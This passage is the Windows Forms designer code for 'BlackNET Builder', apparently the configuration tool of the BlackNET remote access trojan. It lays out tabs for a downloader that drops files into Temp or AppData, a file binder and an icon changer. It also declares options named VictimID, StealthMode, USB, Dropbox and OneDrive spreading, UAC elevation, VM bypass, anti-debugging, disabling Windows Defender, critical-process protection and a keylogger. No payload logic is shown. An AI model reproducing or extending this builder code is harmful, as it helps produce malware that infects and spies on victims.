        Me.FilesPaths.Items = New BlackNET_Builder.NSListView.NSListViewItem(-1) {}
        Me.FilesPaths.Location = New System.Drawing.Point(6, 31)
        Me.FilesPaths.MultiSelect = True
        Me.FilesPaths.Name = "FilesPaths"
        Me.FilesPaths.Size = New System.Drawing.Size(360, 120)
        Me.FilesPaths.TabIndex = 0
        Me.FilesPaths.Text = "NsListView1"
        '
        'Downloader
        '
        Me.Downloader.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.Downloader.Controls.Add(Me.DeleteLink)
        Me.Downloader.Controls.Add(Me.AddLink)
        Me.Downloader.Controls.Add(Me.DownloadPath)
        Me.Downloader.Controls.Add(Me.NsLabel8)
        Me.Downloader.Controls.Add(Me.EnableDownloader)
        Me.Downloader.Controls.Add(Me.DownloadLinksView)
        Me.Downloader.Location = New System.Drawing.Point(119, 4)
        Me.Downloader.Name = "Downloader"
        Me.Downloader.Padding = New System.Windows.Forms.Padding(3)
        Me.Downloader.Size = New System.Drawing.Size(372, 183)
        Me.Downloader.TabIndex = 3
        Me.Downloader.Text = "Downloader"
        '
        'DeleteLink
        '
        Me.DeleteLink.Enabled = False
        Me.DeleteLink.Location = New System.Drawing.Point(308, 156)
        Me.DeleteLink.Name = "DeleteLink"
        Me.DeleteLink.Size = New System.Drawing.Size(58, 23)
        Me.DeleteLink.TabIndex = 11
        Me.DeleteLink.Text = "Del Link"
        '
        'AddLink
        '
        Me.AddLink.Enabled = False
        Me.AddLink.Location = New System.Drawing.Point(241, 156)
        Me.AddLink.Name = "AddLink"
        Me.AddLink.Size = New System.Drawing.Size(61, 23)
        Me.AddLink.TabIndex = 10
        Me.AddLink.Text = "Add Link"
        '
        'DownloadPath
        '
        Me.DownloadPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.DownloadPath.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.DownloadPath.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.DownloadPath.Enabled = False
        Me.DownloadPath.ForeColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.DownloadPath.FormattingEnabled = True
        Me.DownloadPath.Items.AddRange(New Object() {"Temp ", "AppData", "UserProfile", "ProgramData", "WinDir"})
        Me.DownloadPath.Location = New System.Drawing.Point(56, 156)
        Me.DownloadPath.Name = "DownloadPath"
        Me.DownloadPath.Size = New System.Drawing.Size(121, 21)
        Me.DownloadPath.TabIndex = 9
        '
        'NsLabel8
        '
        Me.NsLabel8.Font = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.NsLabel8.Location = New System.Drawing.Point(5, 156)
        Me.NsLabel8.Name = "NsLabel8"
        Me.NsLabel8.Size = New System.Drawing.Size(75, 19)
        Me.NsLabel8.TabIndex = 8
        Me.NsLabel8.Text = "NsLabel8"
        Me.NsLabel8.Value1 = "Drop to: "
        '
        'EnableDownloader
        '
        Me.EnableDownloader.Checked = False
        Me.EnableDownloader.Location = New System.Drawing.Point(7, 6)
        Me.EnableDownloader.Name = "EnableDownloader"
        Me.EnableDownloader.Size = New System.Drawing.Size(137, 23)
        Me.EnableDownloader.TabIndex = 7
        Me.EnableDownloader.Text = "Enable Downloader"
        '
        'DownloadLinksView
        '
        Me.DownloadLinksView.Columns = New BlackNET_Builder.NSListView.NSListViewColumnHeader(-1) {}
        Me.DownloadLinksView.Enabled = False
        Me.DownloadLinksView.Items = New BlackNET_Builder.NSListView.NSListViewItem(-1) {}
        Me.DownloadLinksView.Location = New System.Drawing.Point(7, 32)
        Me.DownloadLinksView.MultiSelect = True
        Me.DownloadLinksView.Name = "DownloadLinksView"
        Me.DownloadLinksView.Size = New System.Drawing.Size(360, 118)
        Me.DownloadLinksView.TabIndex = 6
        Me.DownloadLinksView.Text = "NsListView2"
        '
        'ChangeIcon
        '
        Me.ChangeIcon.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.ChangeIcon.Controls.Add(Me.CustomIconFromFile)
        Me.ChangeIcon.Controls.Add(Me.CustomIcon)
        Me.ChangeIcon.Controls.Add(Me.NoIcon)
        Me.ChangeIcon.Controls.Add(Me.AddIconFromFile)
        Me.ChangeIcon.Controls.Add(Me.IconPath)
        Me.ChangeIcon.Controls.Add(Me.IconListView)
        Me.ChangeIcon.Location = New System.Drawing.Point(119, 4)
        Me.ChangeIcon.Name = "ChangeIcon"
        Me.ChangeIcon.Padding = New System.Windows.Forms.Padding(3)
        Me.ChangeIcon.Size = New System.Drawing.Size(372, 183)
        Me.ChangeIcon.TabIndex = 4
        Me.ChangeIcon.Text = "Icon Changer"
        '
        'CustomIconFromFile
        '
        Me.CustomIconFromFile.Checked = False
        Me.CustomIconFromFile.Location = New System.Drawing.Point(198, 6)
        Me.CustomIconFromFile.Name = "CustomIconFromFile"
        Me.CustomIconFromFile.Size = New System.Drawing.Size(157, 23)
        Me.CustomIconFromFile.TabIndex = 7
        Me.CustomIconFromFile.Text = "Custom Icon From File"
        '
        'CustomIcon
        '
        Me.CustomIcon.Checked = False
        Me.CustomIcon.Location = New System.Drawing.Point(87, 6)
        Me.CustomIcon.Name = "CustomIcon"
        Me.CustomIcon.Size = New System.Drawing.Size(105, 23)
        Me.CustomIcon.TabIndex = 6
        Me.CustomIcon.Text = "Custom Icon"
        '
        'NoIcon
        '
        Me.NoIcon.Checked = False
        Me.NoIcon.Location = New System.Drawing.Point(6, 6)
        Me.NoIcon.Name = "NoIcon"
        Me.NoIcon.Size = New System.Drawing.Size(75, 23)
        Me.NoIcon.TabIndex = 5
        Me.NoIcon.Text = "No Icon"
        '
        'AddIconFromFile
        '
        Me.AddIconFromFile.Location = New System.Drawing.Point(290, 153)
        Me.AddIconFromFile.Name = "AddIconFromFile"
        Me.AddIconFromFile.Size = New System.Drawing.Size(76, 23)
        Me.AddIconFromFile.TabIndex = 4
        Me.AddIconFromFile.Text = "Select Icon"
        '
        'IconPath
        '
        Me.IconPath.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.IconPath.Location = New System.Drawing.Point(6, 153)
        Me.IconPath.MaxLength = 32767
        Me.IconPath.Multiline = False
        Me.IconPath.Name = "IconPath"
        Me.IconPath.ReadOnly = False
        Me.IconPath.Size = New System.Drawing.Size(278, 23)
        Me.IconPath.TabIndex = 3
        Me.IconPath.Text = "Custom Icon Path"
        Me.IconPath.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.IconPath.UseSystemPasswordChar = False
        '
        'IconListView
        '
        Me.IconListView.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
        Me.IconListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.IconListView.ForeColor = System.Drawing.SystemColors.Window
        Me.IconListView.LargeImageList = Me.IconList
        Me.IconListView.Location = New System.Drawing.Point(6, 32)
        Me.IconListView.MultiSelect = False
        Me.IconListView.Name = "IconListView"
        Me.IconListView.Size = New System.Drawing.Size(360, 115)
        Me.IconListView.Sorting = System.Windows.Forms.SortOrder.Ascending
        Me.IconListView.TabIndex = 2
        Me.IconListView.UseCompatibleStateImageBehavior = False
        '
        'Main
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(519, 261)
        Me.Controls.Add(Me.BuilderTheme)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Main"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "BlackNET Builder"
        Me.BuilderTheme.ResumeLayout(False)
        Me.BuilderSettings.ResumeLayout(False)
        Me.MainSettings.ResumeLayout(False)
        Me.Persistence.ResumeLayout(False)
        Me.Extra.ResumeLayout(False)
        Me.Binder.ResumeLayout(False)
        Me.Downloader.ResumeLayout(False)
        Me.ChangeIcon.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents BuilderTheme As BlackNET_Builder.NSTheme
    Friend WithEvents BuilderSettings As BlackNET_Builder.NSTabControl
    Friend WithEvents MainSettings As System.Windows.Forms.TabPage
    Friend WithEvents Extra As System.Windows.Forms.TabPage
    Friend WithEvents CloseSoftware As BlackNET_Builder.NSControlButton
    Friend WithEvents CompileClient As BlackNET_Builder.NSButton
    Friend WithEvents PanelURL As BlackNET_Builder.NSTextBox
    Friend WithEvents Binder As System.Windows.Forms.TabPage
    Friend WithEvents FilesPaths As BlackNET_Builder.NSListView
    Friend WithEvents Downloader As System.Windows.Forms.TabPage
    Friend WithEvents ChangeIcon As System.Windows.Forms.TabPage
    Friend WithEvents VictimID As BlackNET_Builder.NSTextBox
    Friend WithEvents NsLabel2 As BlackNET_Builder.NSLabel
    Friend WithEvents CheckPanel As BlackNET_Builder.NSButton
    Friend WithEvents NsLabel1 As BlackNET_Builder.NSLabel
    Friend WithEvents NsLabel3 As BlackNET_Builder.NSLabel
    Friend WithEvents DataSplitter As BlackNET_Builder.NSTextBox
    Friend WithEvents NsLabel4 As BlackNET_Builder.NSLabel
    Friend WithEvents MUTEX As BlackNET_Builder.NSRandomPool
    Friend WithEvents Persistence As System.Windows.Forms.TabPage
    Friend WithEvents IconListView As System.Windows.Forms.ListView
    Friend WithEvents InstallPath As BlackNET_Builder.NSComboBox
    Friend WithEvents StealthMode As BlackNET_Builder.NSCheckBox
    Friend WithEvents FileName As BlackNET_Builder.NSTextBox
    Friend WithEvents NsLabel6 As BlackNET_Builder.NSLabel
    Friend WithEvents NsLabel5 As BlackNET_Builder.NSLabel
    Friend WithEvents Watchdog As BlackNET_Builder.NSCheckBox
    Friend WithEvents DebugMode As BlackNET_Builder.NSCheckBox
    Friend WithEvents USBSpread As BlackNET_Builder.NSCheckBox
    Friend WithEvents ElevateUAC As BlackNET_Builder.NSCheckBox
    Friend WithEvents BypassVM As BlackNET_Builder.NSCheckBox
    Friend WithEvents AntiDebugging As BlackNET_Builder.NSCheckBox
    Friend WithEvents EnableAES As BlackNET_Builder.NSCheckBox
    Friend WithEvents DropboxSpread As BlackNET_Builder.NSCheckBox
    Friend WithEvents OnedriveSpread As BlackNET_Builder.NSCheckBox
    Friend WithEvents DeleteFile As BlackNET_Builder.NSButton
    Friend WithEvents AddFile As BlackNET_Builder.NSButton
    Friend WithEvents DroperPath As BlackNET_Builder.NSComboBox
    Friend WithEvents NsLabel7 As BlackNET_Builder.NSLabel
    Friend WithEvents EnableBinder As BlackNET_Builder.NSCheckBox
    Friend WithEvents DeleteLink As BlackNET_Builder.NSButton
    Friend WithEvents AddLink As BlackNET_Builder.NSButton
    Friend WithEvents DownloadPath As BlackNET_Builder.NSComboBox
    Friend WithEvents NsLabel8 As BlackNET_Builder.NSLabel
    Friend WithEvents EnableDownloader As BlackNET_Builder.NSCheckBox
    Friend WithEvents DownloadLinksView As BlackNET_Builder.NSListView
    Friend WithEvents PoweredBy As BlackNET_Builder.KachClazz
    Friend WithEvents IconList As System.Windows.Forms.ImageList
    Friend WithEvents CustomIconFromFile As BlackNET_Builder.NSRadioButton
    Friend WithEvents CustomIcon As BlackNET_Builder.NSRadioButton
    Friend WithEvents NoIcon As BlackNET_Builder.NSRadioButton
    Friend WithEvents AddIconFromFile As BlackNET_Builder.NSButton
    Friend WithEvents IconPath As BlackNET_Builder.NSTextBox
    Friend WithEvents CheckForUpdate As BlackNET_Builder.NSButton
    Friend WithEvents ExecutionDelayTime As BlackNET_Builder.NSTextBox
    Friend WithEvents NsLabel9 As BlackNET_Builder.NSLabel
    Friend WithEvents DelayExecution As BlackNET_Builder.NSCheckBox
    Friend WithEvents GenerateSleep As BlackNET_Builder.NSButton
    Friend WithEvents CriticalProcess As BlackNET_Builder.NSCheckBox
    Friend WithEvents ClientExt As BlackNET_Builder.NSComboBox
    Friend WithEvents DisableWD As BlackNET_Builder.NSCheckBox
    Friend WithEvents Startup As BlackNET_Builder.NSRadioButton
    Friend WithEvents SchTask As BlackNET_Builder.NSRadioButton
    Friend WithEvents GenerateID As BlackNET_Builder.NSButton
    Friend WithEvents KeyloggerOnRun As BlackNET_Builder.NSCheckBox

End Class
